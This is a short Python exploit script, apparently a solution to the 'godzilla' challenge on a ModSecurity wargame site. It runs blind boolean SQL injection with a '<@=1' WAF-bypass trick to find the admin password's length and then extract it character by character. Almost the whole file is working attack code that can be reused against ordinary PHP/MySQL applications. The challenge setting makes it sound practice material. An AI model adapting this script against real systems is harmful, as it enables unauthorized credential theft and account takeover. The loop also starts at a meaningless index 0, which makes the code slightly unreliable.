import requests
from settings import session_id


# 기본 설정
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
cookies = {'PHPSESSID': session_id}


# 비밀번호 자릿수 확인
# - 1부터 50까지 테스트
def find_pw_length():
    for n in range(1, 50 + 1):
        payload = "?id=-1'<@=1 OR id='admin' and length(pw)=" + str(n) + " OR '&pw=a"
        res = requests.get(url + payload, cookies=cookies, timeout=5)  # WAF가 걸려 있으니 timeout을 건다.

        # Hello admin 문자열이 반환되면 참
        if "Hello admin" in res.text:
            return n
    return


# 구한 비밀번호 길이 값을 가지고 비밀번호 값을 구하는 함수
def find_pw(length):
    pw = str()
    for i in range(0, length + 1):
        for j in range(33, 127):
            # substr과 ascii를 사용해 각 자리 별로 참에 해당하는 값을 구한다.
            payload = f"?id='<@=1 or id='admin' and ascii(substr(pw,{i},1))={j}-- -"
            res = requests.get(url + payload, cookies=cookies, timeout=5)  # WAF가 걸려 있으니 timeout을 건다.)

            # Hello admin 문자열이 반환되면 참
            if "Hello admin" in res.text:
                print(chr(j))
                pw += chr(j)
                break
    return pw


pw_length = find_pw_length()
print(f"Password length: {pw_length}")
pw = find_pw(pw_length)
print(f"Password: {pw}")
